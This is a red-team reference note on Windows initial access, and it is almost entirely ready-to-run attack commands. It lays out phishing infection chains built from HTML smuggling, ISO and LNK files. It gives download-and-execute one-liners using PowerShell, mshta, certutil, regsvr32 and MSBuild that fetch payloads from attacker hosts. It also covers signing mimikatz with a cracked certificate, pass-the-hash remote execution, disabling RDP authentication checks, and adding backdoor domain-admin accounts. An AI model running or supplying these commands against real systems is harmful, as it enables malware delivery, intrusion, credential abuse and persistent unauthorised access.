---
title: "Initial Access Techniques"
created: "2026-04-15"
type: reference-note
status: active
tags:
  - reference-note
  - initial-access
  - payloads
  - red-team
  - windows
  - phishing
---

# Initial Access Techniques

Reference for initial access vectors, payload types, and Windows remote execution using credentials.

**Related Notes:**
- [[AV-EDR-Evasion-Reference]]
- [[Network-Pivoting-Reference]]
- [[AD-Credential-Attacks]]
- [[PowerShell-Red-Team-Reference]]

---

## Infection Chain Model

```
DELIVERY(CONTAINER(TRIGGER + PAYLOAD + DECOY))

DELIVERY   — HTML smuggling, SVG smuggling, email attachments
CONTAINER  — ISO/IMG, ZIP, WIM (bundles all infection dependencies)
TRIGGER    — LNK, CHM, ClickOnce (executes the payload)
PAYLOAD    — Binary, code execution file, or embedded file
DECOY      — PDF that opens after detonation to maintain pretext
```

**Example chain used by TA551/Storm-0303:**
`HTML Smuggling → Password-protected ZIP → ISO(LNK + IcedID + PNG)`

---

## Container Formats

| Format | Notes |
|--------|-------|
| **ISO/IMG** | Auto-mounted on Windows; run with `powershell -c .\malware.exe` |
| **ZIP** | Can hide files; unpack + cd + run |
| **WIM** | Windows Image, native format |
| **7z/RAR/GZ** | Native support in Windows 11 |

```powershell
# Mount/unmount WIM
Mount-WindowsImage -ImagePath myarchive.wim -Path "C:\output" -Index 1
Dismount-WindowsImage -Path "C:\output" -Discard
```

---

## Payload Types

### Binary Payloads

```powershell
# EXE — run directly
.\payload.exe

# DLL — run via rundll32
rundll32 main.dll,DllMain

# CPL — run via Control Panel
control.exe payload.cpl
```

### Code Execution Files

```powershell
# Word/Excel macros (.doc, .docm, .xll, .xlam)
xcopy /Q/R/S/Y/H/G/I evil.ini %APPDATA%\Microsoft\Excel\XLSTART

# MSI installer
powershell Unblock-File evil.msi; msiexec /q /i .\evil.msi

# VBS / WSH
cscript.exe payload.vbs
wscript payload.vbs
wscript /e:VBScript payload.txt

# PowerShell
powershell -ExecutionPolicy Bypass -File payload.ps1
```

---

## Code Signing Bypass

```powershell
# Crack password-protected PFX certificate
pfx2john.py cert.pfx > pfx.hashes
john --wordlist=/opt/wordlists/rockyou.txt --format=pfx pfx.hashes

# Sign a binary with a leaked/cracked cert
osslsigncode sign -pkcs12 certs/nvidia-2014.pfx -in mimikatz.exe -out signed-mimikatz.exe -pass nv1d1aRules
```

---

## Windows Download & Execute (LOLBins)

### PowerShell

```powershell
# Download and execute from HTTP
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<attacker>/payload.ps1')|iex"

# Download file only
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/tool.exe", "C:\Windows\Temp\tool.exe")

# Download and load .NET assembly in memory (Rubeus example)
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())

# From WebDAV
powershell -exec bypass -f \\webdavserver\share\payload.ps1
```

### cmd.exe

```cmd
cmd.exe /k < \\webdavserver\share\batchfile.txt
```

### Mshta

```powershell
mshta http://attacker/payload.hta
mshta \\webdavserver\share\payload.hta
mshta vbscript:Close(Execute("GetObject(""script:http://attacker/payload.sct"")"))
```

### Rundll32

```powershell
rundll32 \\webdavserver\share\payload.dll,entrypoint
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://attacker/payload.sct");window.close();
```

### Certutil

```powershell
certutil -urlcache -split -f http://attacker/payload.b64 payload.b64 && certutil -decode payload.b64 payload.exe && payload.exe
```

### Bitsadmin

```powershell
bitsadmin /transfer job /download /priority normal http://<attacker>/xyz.exe C:\Users\%USERNAME%\AppData\Local\Temp\xyz.exe
```

### Regsvr32 (SCT execution)

```powershell
regsvr32 /u /n /s /i:http://attacker/payload.sct scrobj.dll
```

### MSBuild

```powershell
cmd /V /c "set MB=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe & !MB! /noautoresponse /preprocess \\webdavserver\share\payload.xml > payload.xml & !MB! payload.xml"
```

---

## Windows Remote Execution with Credentials

### netexec (CrackMapExec successor)

```powershell
# Multi-protocol support
netexec smb  192.168.1.100 -u Administrator -p "Password123"
netexec smb  192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"   # NT Hash
netexec ldap 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
netexec rdp  192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
netexec winrm 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"

# Kerberos auth
export KRB5CCNAME=/tmp/admin.ccache
netexec smb 192.168.1.100 -u admin --use-kcache
```

### Impacket Exec Methods

| Method | Ports | Admin Required |
|--------|-------|----------------|
| psexec.py | tcp/445 | Yes |
| smbexec.py | tcp/445 | No |
| atexec.py | tcp/445 | No |
| dcomexec.py | tcp/135, 445, 49751 | No |
| wmiexec.py | tcp/135, 445, 50911 | Yes |

```bash
psexec.py   DOMAIN/user:pass@10.10.10.10
smbexec.py  DOMAIN/user:pass@10.10.10.10
wmiexec.py  DOMAIN/user:pass@10.10.10.10
wmiexec.py  DOMAIN/user@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0...
dcomexec.py DOMAIN/user:pass@10.10.10.10
atexec.py   DOMAIN/user:pass@10.10.10.10
```

```powershell
# Allow non-RID500 local admins for WMI/PSExec
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /d 1
```

### RDP

```bash
# xfreerdp
xfreerdp /v:10.0.0.1 /u:username /p:'Password123!' +clipboard /cert-ignore /size:1366x768
xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:<ntlm-hash>   # Pass-the-Hash (Restricted Admin)

# rdesktop
rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/tmp/share
```

```powershell
# Enable RDP via registry
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Disable NLA
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)

# Enable via netexec
netexec 192.168.1.100 -u user -H <hash> -M rdp -o ACTION=enable
```

### WinRM / evil-winrm

```bash
evil-winrm -i <IP> -u <user> -p <password>
evil-winrm -i <IP> -u <user> -H <ntlm-hash>
evil-winrm -i <IP> -u <user> -p <password> -r domain.local   # Kerberos realm
```

```powershell
# Enable WinRM
winrm quickconfig
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.10.10.10"
```

### PowerShell Remoting

```powershell
$pass = ConvertTo-SecureString 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\user', $pass)

# Remote command
Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }

# Interactive session
Enter-PSSession -ComputerName DC01
```

### WMI

```powershell
wmic /node:target.domain /user:domain\user /password:password process call create "calc.exe"
```

### SSH with Kerberos Ticket

```bash
cp user.ccache /tmp/krb5cc_1045
ssh -o GSSAPIAuthentication=yes user@domain.local
```

### Runas / Net User

```powershell
# Runas (different user)
runas /netonly /user:DOMAIN\username "cmd.exe"

# Create backdoor user
net user hacker Hcker_12345678* /add /Y
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add
net group "Domain Admins" hacker /add /domain

# Default/known credentials
# Guest: username=Guest, NT Hash=31d6cfe0d16ae931b73c59d7e0c089c0 (empty password)
# RetailAdmin (retail demo mode): password=trs10
```
